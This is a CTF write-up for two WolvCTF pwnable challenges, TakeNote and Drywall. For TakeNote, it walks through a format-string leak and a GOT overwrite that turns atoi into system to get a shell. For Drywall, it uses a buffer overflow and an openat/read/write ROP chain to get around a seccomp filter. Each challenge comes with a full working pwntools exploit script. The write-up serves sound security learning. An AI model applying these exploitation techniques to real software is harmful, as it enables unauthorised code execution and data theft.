---
title: WOLVECTF PWNABLE

---

# WOLVECTF PWNABLE
## INTRODUCTION

This is the write-ups for Pwnable challenges, including:
- **TakeNote** 
- **Drywall**

## TAKENOTE
![{49BB4AD6-54FD-4A0D-AC1F-8E79985017C0}](https://hackmd.io/_uploads/HyzywMg6Jl.png)

### IDA
We have the `run` function decompiled:
```c=
void __noreturn run()
{
  int v0; // [rsp+8h] [rbp-58h] BYREF
  int v1; // [rsp+Ch] [rbp-54h] BYREF
  int i; // [rsp+10h] [rbp-50h]
  int v3; // [rsp+14h] [rbp-4Ch]
  char *v4; // [rsp+18h] [rbp-48h]
  _DWORD *v5; // [rsp+20h] [rbp-40h]
  char s[3]; // [rsp+2Dh] [rbp-33h] BYREF
  char src[40]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v8; // [rsp+58h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  banner();
  puts("\nWelcome to my special note taking software!\n");
  puts("Here you will be able to take all the notes you want!\n");
  puts("How many notes do you need to write?\n");
  fgets(s, 3, stdin);
  v3 = atoi(s);
  v4 = (char *)malloc(16 * (v3 + 1));
  v5 = malloc(v3);
  for ( i = 0; i < v3; ++i )
    v5[i] = 0;
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v0);
    getchar();
    if ( v0 == 3 )
    {
      puts("Thank you for taking notes with us!\n");
      exit(0);
    }
    if ( v0 > 3 )
      break;
    if ( v0 == 1 )
    {
      printf("Which note do you want to write to? [0 - %d]\n", v3 - 1);
      __isoc99_scanf("%d", &v1);
      getchar();
      if ( v1 < 0 || v3 <= v1 )
      {
        puts("Nice try buddy *-*\n");
        exit(1);
      }
      fgets(src, 33, stdin);
      strncpy(&v4[16 * v1], src, 0x11uLL);
      v5[v1] = 1;
    }
    else
    {
      if ( v0 != 2 )
        break;
      puts("Which note do you want to print?\n");
      __isoc99_scanf("%d", &v1);
      getchar();
      if ( v1 < 0 || v3 <= v1 )
      {
        puts("Nice try buddy *-*\n");
        exit(1);
      }
      if ( !v5[v1] )
      {
        puts("You haven't written that note yet >:(\n");
        exit(1);
      }
      puts("Your note reads:\n");
      printf(&v4[16 * v1]);
    }
  }
  puts("Uhm, that's not an option. You might want to look at this: https://www.youtube.com/watch?v=uHgt8giw1LY\n");
  exit(0);
}
```
> Firstly, the `banner()` is called to print out the program's banner, then we will be asked for the number of note that will be created by memory dynamic allocations.  
> Secondly, the `menu()` is called for the table of contents including `Write a Note/Read a Note/Exit` corresponding to the option `1, 2, 3` and then we will be ask to choose an option. 
> - Option 1: We will be able to write something in the note with the index, which will be available only from 0 to the number of note you created - 1. All of the details written will be store in the heap section.
> - Option 2: We will be able to print the details of the notes and this action will be available only if we have written something in the note and the index is valid.
> 
> Finally, we will have the notification of invalid option following by the program exit.

### IDEA
With the Format String bug at the option 2, we can use it for the addresses leaking. Unfortunately, there is no function that can help us with getting the flag and also we are not be able to have a Buffer Overflow executed. So our solution will be replacing the PLT address of a function by system function and call it with the only argument is '/bin/sh'.
### EXPLOIT
#### 1. Checksec & Libc
##### Checksec
![{50FFAB5C-97E9-43C9-A2CC-FD821AFF6B8D}](https://hackmd.io/_uploads/HyFPk7lT1e.png)
> The RELRO protection is completely off, making sense for overwriting the GOT/PLT addresses.
##### Libc
How about the libc files ? We have not been given the libc files yet. We can easily have it from the given Dockerfile: (This idea is given by **wh0isthatguy**)
```
FROM ubuntu:20.04 as chroot

RUN /usr/sbin/useradd --no-create-home -u 1000 user

COPY flag.txt /home/user/
COPY chal /home/user/

FROM gcr.io/kctf-docker/challenge@sha256:0f7d757bcda470c3bbc063606335b915e03795d72ba1d8fdb6f0f9ff3757364f

COPY --from=chroot / /chroot

COPY nsjail.cfg /home/user/

CMD kctf_setup && \
    kctf_drop_privs \
    socat \
      TCP-LISTEN:1337,reuseaddr,fork \
      EXEC:"kctf_pow nsjail --config /home/user/nsjail.cfg -- /home/user/chal"
```
With the Ubuntu version, we will enter the Docker server as a root by the command: `sudo docker run -it <version docker> sh`
![{418D2147-13D6-4917-AB60-63ABBFC259BD}](https://hackmd.io/_uploads/By4NE7lTkg.png)
We successfully entered the server and now we will find the libc files by the command: `find / -name "libc.so.6" 2>/dev/null`
![{E18BB533-928A-44D9-ABAE-4BA2444E4635}](https://hackmd.io/_uploads/Hyqt4Qe6Jx.png)
Just like that we got the path to the libc files. Once we moved in the folder, we will scan for `libc-2.31.so` and `ld-2.31.so` 
![{5F031592-3369-43A3-9570-94AA4F124EF9}](https://hackmd.io/_uploads/BJFFBmg6kl.png)
And next, copy it to our folder by the command `sudo docker cp <container_id>:/<file_path> ./<file>`
![{627B039B-3BC9-46CB-9E17-24D151565D42}](https://hackmd.io/_uploads/rk7armgp1x.png)
Finally we got them all.
#### 2. Addresses Leaking
We will have a stop right before the `printf` function is called with the Format String bug for the stack investigation:
![{F8FA2D16-6CD4-467D-BB9F-A04B4EFE9D9B}](https://hackmd.io/_uploads/r1KP-7xpye.png)
We can easily have the binary and libc address leaked at the padding index 19, 23, respectively with the following script:
```python=
sla(b'write?\n\n',b'5')
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(f'%19$p%23$p'.encode())
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')
ru(b'reads:\n\n')
```
We will receive and calculate it for the base addresses. Finally, have a check on them:
![{B6D7983D-89FF-47C2-B546-93BA949A1B1D}](https://hackmd.io/_uploads/SycrwQeakx.png)
They are all right !

#### 3. Cooking Shell
With the binary and libc base addresses, we can easily call the `system` function in the payload for the overwritting process and the `atoi` function will be the chosen one for overwritting because its first argument is our choice and we will have the program return back to `main` to execute `atoi` by replacing the `exit` fuction with `main`. The script will be added by:
```python=
p0 = f'%{s1}c%14$hhn'.encode()
p0 = p0.ljust(0x10)
p0 += p64(exe.got.atoi)
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(p0)
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')

p1 = f'%{s2}c%14$hn'.encode()
p1 = p1.ljust(0x10)
p1 += p64(exe.got.atoi+1)
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(p1)
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')

smain = exe.sym.main & 0xffff
p2 = f'%{smain}c%14$hn'.encode()
p2 = p2.ljust(0x10)
p2 += p64(exe.got.exit)
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(p2)
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')

sla(b'3. Exit\n\n',b'3')
sla(b'write?\n\n',b'sh')
```
Give it a run and we will have the shell
![{84142201-6BAF-4720-8DC5-2FA9DD07DB07}](https://hackmd.io/_uploads/ryLYj7laJx.png)
How about on the server?
![{A61C7F8B-13CB-4DB2-AE43-3F796D329EC6}](https://hackmd.io/_uploads/B1s6img61e.png)
Finally, we got the flag!

=> **Challenge completed!**

### FULL SCRIPT
```python=
#!/usr/bin/env python3

from pwn import *

exe = ELF('chal_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*run+88
        b*run+224
        b*run+619
        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # return p


if args.REMOTE:
    p = remote('takenote.kctf-453514-codelab.kctf.cloud',1337)
else:
    p = process([exe.path])
GDB()

#Leak address
#exe = 19
#libc = 23
sla(b'write?\n\n',b'5')
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(f'%19$p%23$p'.encode())
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')
ru(b'reads:\n\n')
data = ru(b'\n').split(b'0x')
exe_leak = int(data[1],16)
libc_leak = int(data[2],16)
info("Leak address:")
info("Exe leak: "+hex(exe_leak))
info("Libc leak: "+hex(libc_leak))
info("Base address:")
exe.address = exe_leak - 0x158b
libc.address = libc_leak - 0x24083
info("Exe base: "+hex(exe.address))
info("Libc base: "+hex(libc.address))

#Shell
s1 = libc.sym.system & 0xff
s2 = libc.sym.system >> 8 & 0xffff
print(hex(s1))
print(hex(s2))

p0 = f'%{s1}c%14$hhn'.encode()
p0 = p0.ljust(0x10)
p0 += p64(exe.got.atoi)
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(p0)
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')

p1 = f'%{s2}c%14$hn'.encode()
p1 = p1.ljust(0x10)
p1 += p64(exe.got.atoi+1)
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(p1)
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')

smain = exe.sym.main & 0xffff
p2 = f'%{smain}c%14$hn'.encode()
p2 = p2.ljust(0x10)
p2 += p64(exe.got.exit)
sla(b'3. Exit\n\n',b'1')
sla(b'to? [0 - 4]\n',b'0')
sl(p2)
sla(b'3. Exit\n\n',b'2')
sla(b'print?\n\n',b'0')

sla(b'3. Exit\n\n',b'3')
sla(b'write?\n\n',b'sh')
p.interactive()
#wctf{m3m0ry_l4y0u7_1s_crUc1Al_f0r_3xpL01t5}
```

## DRYWALL
![{FE22025C-5450-4A94-84BB-379246221B0A}](https://hackmd.io/_uploads/BJivnmx6ye.png)

### IDA
We have the `main` function decompiled:
```c=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[264]; // [rsp+0h] [rbp-110h] BYREF
  __int64 v5; // [rsp+108h] [rbp-8h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v5 = seccomp_init(2147418112LL);
  seccomp_rule_add(v5, 0LL, 59LL, 0LL);
  seccomp_rule_add(v5, 0LL, 2LL, 0LL);
  seccomp_rule_add(v5, 0LL, 322LL, 0LL);
  seccomp_rule_add(v5, 0LL, 19LL, 0LL);
  seccomp_rule_add(v5, 0LL, 20LL, 0LL);
  seccomp_rule_add(v5, 0LL, 310LL, 0LL);
  seccomp_rule_add(v5, 0LL, 311LL, 0LL);
  seccomp_load(v5);
  puts("What is your name, epic H4x0r?");
  fgets(name, 30, stdin);
  printf("Good luck %s <|;)\n", name);
  printf("%p\n", main);
  fgets(s, 0x256, stdin);
  return 0;
}
```
> Firstly, the virtual buffer for stdout, stderr, stdin are turn off and then the seccomp rule for the executable syscall are added.
> Secondly, we will be asked for name, and also with the input data for `s` variable right after the `main` address is printed out.

### IDEA
There is no function can help with getting flag but fortunately, we have a Buffer Overflow bug for controlling the return address and `main` address leaked for binary base address calculation, so the solution for this challenge is a ROPchain.

### EXPLOIT
#### 1. Checksec
![{639C8E4F-DAF2-4742-9986-FF2AC1B5AA2F}](https://hackmd.io/_uploads/ryEmP4lTkl.png)
> All of the security methods are turned on except the canary so it's suitable for a ROPchain.
#### 2. Seccomp
![{FD7D4BBE-1B41-4B7A-9ABA-D6B12F782E34}](https://hackmd.io/_uploads/BkgiD4eTJl.png)
> The seccomp rules are added for the prevention of `open`,`readv`,`writev`,`execve`,`process_vm_readv`,`process_vm_writev`,`execveat` from being executed.
> We are not allowed to use `execve` and `open` so the solution for this is using `openat`,`read`,`write` to get the details of the flag file.

#### 3. Cooking Shell
We will craft the blocks of gadgets for the processes including: 
- Reading the string 'flag.txt' to a readable and writable section.
- Using `openat` to open the file.
- Reading the details to a readable and writable section.
- Writting the details to the screen.
And we will have those blocks of gadgets like this:
```python=
#Gadgets
exe.address = leak - 0x11a3
prdi = exe.address + 0x13db 
prdx = exe.address + 0x1199 
prsir15 = exe.address + 0x13d9 
prax = exe.address + 0x119b 
sys = exe.address + 0x119d
ret = exe.address + 0x1016
bss = exe.address + 0x4200
#Blocks
readflag = flat(prdi, 0, prsir15, bss, 0, prdx, 100, prax, 0, sys)
open_at = flat(prdi, -100, prsir15, bss, 0, prdx, 0, prax, 257, sys, ret)
read = flat(prdi, 3, prsir15, bss, 0, prdx, 100, prax, 0, sys)
write = flat(prdi, 1, prsir15, bss, 0, prdx, 100, prax, 1, sys)
```
Then, we will craft the blocks of gadgets together in the payload:
```python=
p0 = b'a'*0x110 + p64(bss+0x300) + readflag + open_at + p64(leak+438)
p1 = b'b'*0x118 + read + write
```
We have to devide the process into 2 payload because of the limit size of the input. And we will give it a run at local:
![{03B99751-8A2E-41EC-8524-DD8EC0FED44D}](https://hackmd.io/_uploads/r1OBoNeTyg.png)
We have the test flag printed out and on the server the flag will be:
![{87ED32E9-0088-46ED-B02E-C3E6407FB613}](https://hackmd.io/_uploads/SkVti4lakg.png)

=> **Challenge completed!**

### FULL SCRIPT
```python=
#!/usr/bin/env python3

from pwn import *

exe = ELF('chal', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+385
        b*main+460
        b*main+471

        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # return p


if args.REMOTE:
    p = remote('drywall.kctf-453514-codelab.kctf.cloud',1337)
else:
    p = process([exe.path])
GDB()

sla(b'H4x0r?\n',b'Hiu')
ru(' <|;)\n')
leak = int(rl()[:-1],16)
info("Main leak: "+hex(leak))
exe.address = leak - 0x11a3
prdi = exe.address + 0x13db 
prdx = exe.address + 0x1199 
prsir15 = exe.address + 0x13d9 
prax = exe.address + 0x119b 
sys = exe.address + 0x119d
ret = exe.address + 0x1016
bss = exe.address + 0x4200
readflag = flat(prdi, 0, prsir15, bss, 0, prdx, 100, prax, 0, sys)
open_at = flat(prdi, -100, prsir15, bss, 0, prdx, 0, prax, 257, sys, ret)
read = flat(prdi, 3, prsir15, bss, 0, prdx, 100, prax, 0, sys)
write = flat(prdi, 1, prsir15, bss, 0, prdx, 100, prax, 1, sys)
p0 = b'a'*0x110 + p64(bss+0x300) + readflag + open_at + p64(leak+438)
p1 = b'b'*0x118 + read + write
sl(p0)
s(b'flag.txt')
sleep(10)
sl(p1)
p.interactive()
#wctf{fL1m5y_w4LL5_br34k_f4r_7h3_31337_459827349}
```